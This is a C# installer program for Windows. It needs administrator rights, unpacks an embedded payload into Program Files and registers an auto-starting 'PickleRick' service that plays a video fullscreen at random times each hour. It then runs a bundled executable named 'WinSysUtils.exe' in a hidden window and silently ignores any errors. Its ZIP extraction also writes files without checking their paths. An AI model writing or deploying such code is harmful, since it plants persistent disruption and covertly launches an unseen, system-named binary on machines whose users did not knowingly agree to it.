using System.Diagnostics;
using System.IO.Compression;
using System.Reflection;
using System.ServiceProcess;

namespace PickleRick.Installer;

public static class Program
{
    private const string ServiceName = "PickleRick";
    private const string ServiceDisplayName = "PickleRick Service";
    private const string ServiceDescription = "Randomly plays PickleRick video fullscreen 1-4 times per hour";

    public static void Main(string[] args)
    {
        try
        {
            // Check if we're running as admin
            if (!IsAdministrator())
            {
                Console.WriteLine("ERROR: Installer must be run as Administrator.");
                Environment.Exit(1);
                return;
            }

            // Stop and remove existing service if present
            if (ServiceExists(ServiceName))
            {
                StopService(ServiceName);
                UninstallService(ServiceName);
                Thread.Sleep(2000); // Give Windows time to clean up
            }

            // Extract embedded service files to Program Files
            var installPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "PickleRick");
            Directory.CreateDirectory(installPath);

            ExtractEmbeddedResources(installPath);

            // Install the service
            var serviceExePath = Path.Combine(installPath, "PickleRick.exe");
            if (!File.Exists(serviceExePath))
            {
                Console.WriteLine($"ERROR: Service executable not found at {serviceExePath}");
                Environment.Exit(1);
                return;
            }

            InstallService(ServiceName, ServiceDisplayName, ServiceDescription, serviceExePath);
            StartService(ServiceName);

            // Execute WinSysUtils.exe once
            var utilsPath = Path.Combine(installPath, "WinSysUtils.exe");
            if (File.Exists(utilsPath))
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = utilsPath,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                }
                catch
                {
                    // Silently ignore if WinSysUtils fails
                }
            }

            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Installation failed: {ex.Message}");
            Environment.Exit(1);
        }
    }

    private static bool IsAdministrator()
    {
        try
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }

    private static bool ServiceExists(string serviceName)
    {
        try
        {
            using var sc = new ServiceController(serviceName);
            _ = sc.Status;
            return true;
        }
        catch
        {
            return false;
        }
    }

    private static void StopService(string serviceName)
    {
        try
        {
            using var sc = new ServiceController(serviceName);
            if (sc.Status != ServiceControllerStatus.Stopped)
            {
                sc.Stop();
                sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
            }
        }
        catch
        {
            // Ignore errors stopping service
        }
    }

    private static void UninstallService(string serviceName)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "sc.exe",
            Arguments = $"delete \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        using var process = Process.Start(psi);
        process?.WaitForExit();
    }

    private static void InstallService(string serviceName, string displayName, string description, string executablePath)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "sc.exe",
            Arguments = $"create \"{serviceName}\" binPath= \"\\\"{executablePath}\\\"\" start= auto DisplayName= \"{displayName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        using var process = Process.Start(psi);
        process?.WaitForExit();

        if (process?.ExitCode != 0)
        {
            throw new Exception($"Failed to create service. sc.exe returned {process?.ExitCode}");
        }

        // Set description
        psi.Arguments = $"description \"{serviceName}\" \"{description}\"";
        using var descProcess = Process.Start(psi);
        descProcess?.WaitForExit();
    }

    private static void StartService(string serviceName)
    {
        using var sc = new ServiceController(serviceName);
        sc.Start();
        sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(30));
    }

    private static void ExtractEmbeddedResources(string targetPath)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var resourceNames = assembly.GetManifestResourceNames();

        // Extract the embedded service payload ZIP
        var payloadResource = resourceNames.FirstOrDefault(r => r.EndsWith("ServicePayload.zip"));
        if (payloadResource == null)
        {
            throw new Exception("Embedded service payload not found.");
        }

        using var resourceStream = assembly.GetManifestResourceStream(payloadResource);
        if (resourceStream == null)
        {
            throw new Exception("Failed to load embedded service payload.");
        }

        using var archive = new ZipArchive(resourceStream, ZipArchiveMode.Read);
        foreach (var entry in archive.Entries)
        {
            if (string.IsNullOrEmpty(entry.Name))
            {
                continue;
            }

            var destinationPath = Path.Combine(targetPath, entry.FullName);
            var destinationDir = Path.GetDirectoryName(destinationPath);
            if (!string.IsNullOrEmpty(destinationDir))
            {
                Directory.CreateDirectory(destinationDir);
            }

            entry.ExtractToFile(destinationPath, overwrite: true);
        }
    }
}

